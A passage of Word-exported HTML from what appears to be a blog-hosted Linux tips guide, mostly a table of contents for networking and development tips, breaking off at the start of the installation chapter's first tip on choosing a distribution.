539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894780"  ><FONT face="Times New Roman"  >4.6<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 6: Sharing files from a Windows system<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >20</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894781"  ><FONT face="Times New Roman"  >4.7<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 7: Sorry but this host is not in my list<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >20</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894782"  ><FONT face="Times New Roman"  >4.8<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 8: Access to various networks<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >21</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894783"  ><FONT face="Times New Roman"  >4.9<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 9: Accessing remote file systems<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >21</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894784"  ><FONT face="Times New Roman"  >4.10<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 10: Secure Web server<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >21</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894785"  ><FONT face="Times New Roman"  >4.11<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 11: Secure alternative to telnet<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >21</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894786"  ><FONT face="Times New Roman"  >4.12<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 12: Speed problems on a PPP connection<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >22</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894787"  ><FONT face="Times New Roman"  >4.13<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 13: Names and name servers<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >22</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894788"  ><FONT face="Times New Roman"  >4.14<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 14: Who owns this port<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >22</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894789"  ><FONT face="Times New Roman"  >4.15<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 15: Network printers<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >23</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; tab-stops: 21.0pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894790"  ><FONT face="Times New Roman"  >5.<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Development<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >23</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894791"  ><FONT face="Times New Roman"  >5.1<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 1: Graphical messages to the world<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >23</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894792"  ><FONT face="Times New Roman"  >5.2<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 2: Code reuse<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894793"  ><FONT face="Times New Roman"  >5.3<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 3: Makefile don't equal C<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894794"  ><FONT face="Times New Roman"  >5.4<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 4: Parsing the command line in BASH<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894795"  ><FONT face="Times New Roman"  >5.5<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 5: Don't grep grep<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894796"  ><FONT face="Times New Roman"  >5.6<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 6: Move a text into upper case letters<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894797"  ><FONT face="Times New Roman"  >5.7<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 7: Using PASCAL on Linux<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >24</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894798"  ><FONT face="Times New Roman"  >5.8<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 8: Segmentation fault<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >25</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894799"  ><FONT face="Times New Roman"  >5.9<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 9: Who is online?<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >25</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894800"  ><FONT face="Times New Roman"  >5.10<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 10: Graphical toolkits<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >25</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894801"  ><FONT face="Times New Roman"  >5.11<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 11: IDE and visual interfaces<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >25</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894802"  ><FONT face="Times New Roman"  >5.12<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 12: Free software and copyleft<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >26</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894803"  ><FONT face="Times New Roman"  >5.13<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 13: Talking to the terminal<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >26</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894804"  ><FONT face="Times New Roman"  >5.14<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 14: Internet technologies<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >26</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894805"  ><FONT face="Times New Roman"  >5.15<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 15: Library types<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >26</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" ><FONT face="Times New Roman"  >&nbsp;</FONT></SPAN></P>  <H1 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="3" >1.</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="3" >Installation</FONT></SPAN></SPAN></A></H1>  <P style="MARGIN: 0cm 0cm 0pt;"  ><SPAN lang="EN-US" style="mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >What this chapter covers</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >Installation is a very important part of any operating system. This is why I cover this topic first. The next</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >most important thing is installation of programs and software to get your system to do useful tasks. This</FONT></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >chapter covers both of these aspects.</FONT></SPAN></P>  <H2 style="MARGIN: 6pt 0cm 3pt; TEXT-INDENT: 0cm;"  ><A rel="nofollow"><SPAN lang="EN-US" style="mso-fareast-font-family: Arial; mso-bidi-font-family: Arial;"  ><SPAN style="mso-list: Ignore;"  ><FONT size="2" >1.1</FONT><SPAN style="FONT: 7pt 'Times New Roman';"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN></SPAN><SPAN dir="ltr" ><SPAN lang="EN-US" ><FONT size="2" >Tip 1: Which distribution is good for you</FONT></SPAN></SPAN></A></H2>  <P style="MARGIN: 0cm 0cm 0pt; TEXT-ALIGN: left; mso-layout-grid-align: none;"  align="left" ><SPAN lang="EN-US" style="FONT-SIZE: 11pt; COLOR: black; mso-font-kerning: 0pt;"  ><FONT face="Times New Roman"  >They are all good. But that's not a real tip. What you should be looking for is which distribution you feel 